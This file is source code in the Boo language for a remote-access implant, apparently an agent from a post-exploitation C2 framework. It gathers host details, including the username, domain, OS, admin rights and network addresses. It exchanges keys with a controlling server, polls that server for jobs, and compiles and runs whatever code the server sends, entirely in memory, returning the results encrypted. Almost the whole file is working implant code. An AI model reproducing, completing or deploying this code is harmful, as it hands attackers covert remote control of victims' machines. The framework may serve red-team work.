import System
import System.Reflection
import System.Text
import System.IO
import System.Threading
import System.Diagnostics
import System.Net
import System.Net.Security
import System.Net.NetworkInformation
import System.Security.Cryptography
import System.Security.Principal
import System.Web.Script.Serialization
import Boo.Lang.Compiler
import Boo.Lang.Compiler.IO
import Boo.Lang.Compiler.Pipelines
import Microsoft.VisualBasic.Devices
import Microsoft.Win32

/*
public static def MyResolveEventHandler(sender as object, args as ResolveEventArgs) as Assembly:
    print("Trying to resolve $(args.Name).dll")
    result = [asm for asm in AppDomain.CurrentDomain.GetAssemblies()].Find() do (item as Assembly):
        return @/,/.Split(item.ToString())[0] == args.Name

    if result:
        print("Found assembly $(result)")
        return result

    return result
*/

public def urljoin(*args) as string:
    t = map(args) def (arg as object):
        return arg.ToString().TrimEnd(*"/".ToCharArray()).Trim(*"/".ToCharArray())
    return join(t, "/")

public def gen_random_string() as string:
    return Guid.NewGuid().ToString("n").Substring(0, 8)

class CryptoException(Exception):
    def constructor(message):
        super(message)

class CompilationException(Exception):
    def constructor(message):
        super(message)

class Args:
    public source as string
    public references as List

class JsonJob:
    public id as string
    public cmd as string
    public args as Args

#
#
# Comms Section
#
#

PUT_COMMS_HERE

#
#
# End Comms Section
#
#

class Crypto:
    public public_key as string
    private asymAlgo as ECDiffieHellmanCng
    private server_pubkey as ECDiffieHellmanCngPublicKey
    private derived_key as (byte)

    def constructor():
        asymAlgo = ECDiffieHellmanCng()
        public_key = asymAlgo.PublicKey.ToXmlString()

    public def derive_key(xml as string):
        server_pubkey = ECDiffieHellmanCngPublicKey.FromXmlString(xml)
        derived_key = asymAlgo.DeriveKeyMaterial(server_pubkey)

    public def HMAC(key as (byte), message as (byte)) as (byte):
        using hmac = HMACSHA256(key):
            return hmac.ComputeHash(message)

    public def AesEncryptData(cleartext as (byte), key as (byte), iv as (byte)) as (byte):
        using aesAlg = Aes.Create():
            aesAlg.Padding = PaddingMode.PKCS7
            aesAlg.KeySize = 256
            aesAlg.Key = key
            aesAlg.IV = iv

            encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV)

            using encryptedData = MemoryStream():
                using cryptoStream = CryptoStream(encryptedData, encryptor, CryptoStreamMode.Write):
                    cryptoStream.Write(cleartext, 0, cleartext.Length)
                    cryptoStream.FlushFinalBlock()
                    return encryptedData.ToArray()

    public def AesDecryptData(ciphertext as (byte), key as (byte), iv as (byte)) as (byte):
        using aesAlg = Aes.Create():
            aesAlg.Padding = PaddingMode.PKCS7
            aesAlg.KeySize = 256
            aesAlg.Key = key
            aesAlg.IV = iv

            decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV)

            using decryptedData = MemoryStream():
                using cryptoStream = CryptoStream(decryptedData, decryptor, CryptoStreamMode.Write):
                    cryptoStream.Write(ciphertext, 0, ciphertext.Length)
                    cryptoStream.FlushFinalBlock()
                    return decryptedData.ToArray()

    public def Encrypt(data as (byte)) as (byte):
        iv = array(byte, 16)
        RNGCryptoServiceProvider().GetBytes(iv)

        ciphertext = AesEncryptData(data, derived_key, iv)
        hmac = HMAC(derived_key, iv + ciphertext)

        return iv + ciphertext + hmac

    public def Encrypt(data as string) as (byte):
        return Encrypt(Encoding.UTF8.GetBytes(data))

    public def Decrypt(data as (byte)):
        iv, ciphertext, hmac = data[:16], data[16:-32], data[-32:]

        if hmac == HMAC(derived_key, iv + ciphertext):
            return AesDecryptData(ciphertext, derived_key, iv)

        raise CryptoException("Invalid HMAC when decrypting data")

class STJob:
    public Job as JsonJob
    public StartTime as DateTime = DateTime.Now
    public EndTime as DateTime
    private Client as STClient
    private sw as Stopwatch = Stopwatch()

    def constructor(job as JsonJob, client as STClient):
        Client = client
        Job = job
        if Client.Debug:
            print Job.id, Job.cmd

        Start.BeginInvoke(null, null)

    /*
        type = self.GetType()
        method as duck = type.GetMethod(Cmd).GetType()
        method.BeginInvoke(callback, null)

    def callback(result as IAsyncResult):
        sw.Stop()
        EndTime = DateTime.Now
        print("callback: $(Start.EndInvoke(result)), elapsed: $(sw.Elapsed.Seconds), Started: $(StartTime), ended: $(EndTime)")

    */

    public def Start() as string:
        result = {"id": Job.id, "cmd": Job.cmd}
        out as duck
        try:
            if Job.cmd == 'CheckIn':
                out = CheckIn()
            elif Job.cmd == 'CompileAndRun':
                out = CompileAndRun(Job.args.source, Job.args.references)
            result['status'] = 'success'
            result['result'] = out
        except e as Exception:
            result['status'] = 'error'
            result['result'] = "$(e)"

        sw.Stop()
        EndTime = DateTime.Now
        /*
        while true:
            for commChannel in Client.Comms:
        */
        payload = JavaScriptSerializer().Serialize(result)
        if Client.Debug:
            print payload
        while true:
            try:
                Client.CommChannel.KeyExchange()
            except e as Exception:
                if Client.Debug:
                    print "Error performing key exchange: $(e)"
                Thread.Sleep(Client.Sleep)
                continue

            try:
                Client.CommChannel.SendJobResults(payload, Job.id)
                return
            except e as Exception:
                if Client.Debug:
                    print "Error sending job (id: $(Job.id)) results: $(e)"
                Thread.Sleep(Client.Sleep)
                continue

            Thread.Sleep(Client.Sleep)

    public def CheckIn() as Hash:
         return JavaScriptSerializer().Deserialize[of Hash](JavaScriptSerializer().Serialize(Client))

    public def Exit():
        pass

    public def CompileAndRun(source as string, references as List) as string:
        #print("Received source: \n $source")
        booC = BooCompiler()
        booC.Parameters.Input.Add( StringInput("Script.boo", source) )
        booC.Parameters.Pipeline = CompileToMemory()
        booC.Parameters.Ducky = true

        #https://github.com/boo-lang/boo/blob/10cfbf08e0f5568220bc621606a3e49d48dc69a5/src/booc/CommandLineParser.cs#L834-L839
        for r in references:
            booC.Parameters.References.Add(booC.Parameters.LoadAssembly(r, true))

        context = booC.Run()
        if context.GeneratedAssembly is null:
            return "Error compiling source:\n$(join(e for e in context.Errors, '\n'))"
        else:
            var as duck = context.GeneratedAssembly.GetType("ScriptModule")

            using scriptOutput = StringWriter():
                Console.SetOut(scriptOutput)
                Console.SetError(scriptOutput)

                #Call the Main function in the compiled assembly
                var.Main()

                scriptOutput.Flush()

                standardOutput = StreamWriter(Console.OpenStandardOutput())
                standardOutput.AutoFlush = true
                Console.SetOut(standardOutput)

                standardError = StreamWriter(Console.OpenStandardError())
                standardError.AutoFlush = true
                Console.SetError(standardError)

                return scriptOutput.ToString()

    static public def Compile(source as string, references as List) as Assembly:
        booC = BooCompiler()
        booC.Parameters.Input.Add( StringInput("Script.boo", source) )
        booC.Parameters.Pipeline = CompileToMemory()
        booC.Parameters.Ducky = true

        #https://github.com/boo-lang/boo/blob/10cfbf08e0f5568220bc621606a3e49d48dc69a5/src/booc/CommandLineParser.cs#L834-L839
        for r in references:
            booC.Parameters.References.Add(booC.Parameters.LoadAssembly(r, true))

        context = booC.Run()
        if context.GeneratedAssembly is null:
            raise CompilationException("Error compiling source:\n $(join(e for e in context.Errors, '\n'))")

        return context.GeneratedAssembly

class STClient:
    public Jobs as List = []
    public Guid as Guid
    #public C2Channels as List = []
    public CommChannel as Comms
    public Sleep = 5000
    public Username = Environment.UserName
    public Domain = Environment.UserDomainName
    public DotNetVersion = Environment.Version.ToString()
    public Os = "$(ComputerInfo().OSFullName) $(Environment.OSVersion.Version)"
    public OsReleaseId = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ReleaseId", "")
    public Hostname = Environment.MachineName
    public Debug as bool = true

    public OsArch:
        get:
            if IntPtr.Size == 8:
                return "x64"
            return "x86"

    public ProcessId:
        get:
            return Process.GetCurrentProcess().Id

    public ProcessName:
        get:
            return Process.GetCurrentProcess().ProcessName

    public HighIntegrity:
        get:
            identity = WindowsIdentity.GetCurrent()
            principal = WindowsPrincipal(identity)
            return principal.IsInRole(WindowsBuiltInRole.Administrator)

    public NetworkAddresses:
        get:
            addresses = []
            interfaces = NetworkInterface.GetAllNetworkInterfaces()
            for iface in interfaces:
                properties = iface.GetIPProperties()
                addresses.Extend([uni.Address.ToString() for uni in properties.UnicastAddresses if uni.Address.AddressFamily.ToString() == "InterNetwork" and uni.Address.ToString() != '127.0.0.1'])
            return addresses

public static def Main(argv as (string)):
     #AppDomain.CurrentDomain.AssemblyResolve += ResolveEventHandler(MyResolveEventHandler)

    clientGuid = Guid(argv[0])
    client = STClient(Guid: clientGuid, CommChannel: Comms(clientGuid.ToString(), argv[1]))
    #client.C2Channels.Add(Comms(client.Guid.ToString(), "https://192.168.1.236:8443/"))
    #client.Jobs.Add(STJob({'id': 'test', 'cmd':'Start', 'args':''}, client))

    while true:
        #for channel in client.C2Channels
            #while true:
        try:
            client.CommChannel.KeyExchange()
        except e as Exception:
            if client.Debug:
                print "Error performing key exchange: $(e)"
            Thread.Sleep(client.Sleep)
            continue

        try:
            job = client.CommChannel.GetJob()
            if job:
                client.Jobs.Add(STJob(job, client))
        except e as Exception:
            if client.Debug:
                print "Error getting jobs: $(e)"
            Thread.Sleep(client.Sleep)
            continue

        Thread.Sleep(client.Sleep)

    /*
    source = """
import System.Threading
public static def Main():
    print 'What the hell are you talking about?'
    Thread.Sleep(10000)
"""
    client.Jobs.Add(STJob(source))

    #print client.NetworkAddresses, client.HighIntegrity, client.ProcessId, client.ProcessName, client.OsArch

    currentAsm = Assembly.GetExecutingAssembly()
    for f in currentAsm.GetManifestResourceNames():
        using reader = StreamReader(currentAsm.GetManifestResourceStream(f)):
            asm as duck = STJob.Compile(reader.ReadToEnd()).GetType("ScriptModule")
            comms = asm.Comms(client, "http://127.0.0.1:8080/")
    */
